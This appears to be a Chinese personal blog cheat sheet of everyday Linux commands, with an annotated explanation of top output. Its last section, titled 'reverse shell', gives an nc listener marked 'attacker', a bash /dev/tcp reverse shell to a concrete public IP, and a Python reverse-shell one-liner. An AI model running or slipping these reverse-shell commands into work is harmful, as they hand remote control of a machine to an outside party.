---
title: "Linux常用命令(持续更新)"
date: 2020-11-09T16:10:24+08:00
categories: ["Linux"]
tags: ["Linux"]
toc: true
---

Linux常用命令整理记录一下，常用就是个人开发过程中用的比较多的

目的呢还是提高信息检索速度和辅助记忆了，这些命令都是非常容易找到的，但是哪有cv香，哈哈哈哈！😀
<!--more-->

### 命令
查看系统信息
```shell
uname -a
```

查看操作系统版本
```shell
lsb_release -a
```

查看CPU信息
```shell
cat /proc/cpuinfo
cat /proc/cpuinfo | grep name   # 查看逻辑CPU数量和CPU型号
cat /proc/cpuinfo | grep physical   # 查看物理CPU数量
```

top
```shell
top
```
<img src="/assets/2020/1109/top.png"/>

第一行

- `08:36:03`当前系统时间
- `up  6:32`系统已连续运行时间
- `2 users`当前登录系统用户数
- `load average: 0.13, 0.14, 0.15`分别是1分钟、5分钟、15分钟的负载情况

第二行

系统现在有240个任务(进程)、一个运行中、239个休眠、0个终止、0个僵尸进程

第三行

- us(user)用户空间占用CPU的百分比, 运行在用户态的程序
- sy(system)内核空间占用CPU的百分比, 内核负责管理系统进程和硬件资源,用户态进程需要分配内存和读写I/O也需要通过系统调用由内核态执行, %sy太高说明内核占用太多资源或者是用户进程发起了太多的系统调用
- ni(niceness)改变过优先级(优先级不为0)的进程占用CPU的百分比, niceness的取值范围是-20~19,值越小表示优先级越高，默认为0
- id(idle)空闲CPU百分比
- wa(wait)IO等待占用CPU的百分比, I/O操作时CPU也没有其他事情可做的等待时间
- hi(hardware interrupts)硬中断占用CPU的百分比, 一般由I/O设备引起, 需要立即处理
- si(software interrupts)软中断占用CPU的百分比, 
- st和虚拟机有关, 当系统运行在虚拟机中时, 表示当前虚拟机等待CPU为他服务的时间

第四行:内存状态

- total — 物理内存总量
- used — 使用中的内存总量
- free — 空闲内存总量
- buffers — 缓存的内存量
第五行:swap交换分区

- total — 交换区总量
- used — 使用的交换区总量
- free — 空闲交换区总量
- cached — 缓冲的交换区总量

第六行后:进程监控
- PID — 进程id
- USER — 进程所有者
- PR — 进程优先级
- NI — nice值。负值表示高优先级，正值表示低优先级
- VIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES
- RES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA
- SHR — 共享内存大小，单位kb
- S — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程
- %CPU — 上次更新到现在的CPU时间占用百分比
- %MEM — 进程使用的物理内存百分比
- TIME+ — 进程使用的CPU时间总计，单位1/100秒
- COMMAND — 进程名称（命令名/命令行）


查看内存
```shell
free -b | free -m | free -g
```

查看磁盘
```shell
df -h
```

查看文件大小
```shell
du -h
```

查看进程
```shell
ps -ef | grep <name>
```

查看线程
```shell
ps -T -p <PID>
```

mac 路由管理
```shell
sudo route add 172.31.9.201/24 25.25.0.2
sudo route delete 172.31.9/24
```

### 功能
全局搜索
```shell
grep -r -l "VirtualMachineHost" ./ | grep '[a-zA-Z]\{2,\}.py$'
```

列出登录系统失败的ip并按登录次数从大到小排列出前20个
```shell
sudo lastb | awk '{print $3}' | grep '^[0-9]\{2,3\}' | uniq -c | sort -n -r | head -n 20
```

全局替换
```shell
sed -n 's/route/router/gp' file.txt # 打印全局替换的效果
sed -i 's/route/router/g' file.txt  # 全局替换
```

反弹shell
```shell
nc -lnvvp 7777 # attacker

bash -i >& /dev/tcp/60.205.223.161/3333 0>&1 # victim
python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" # victim
```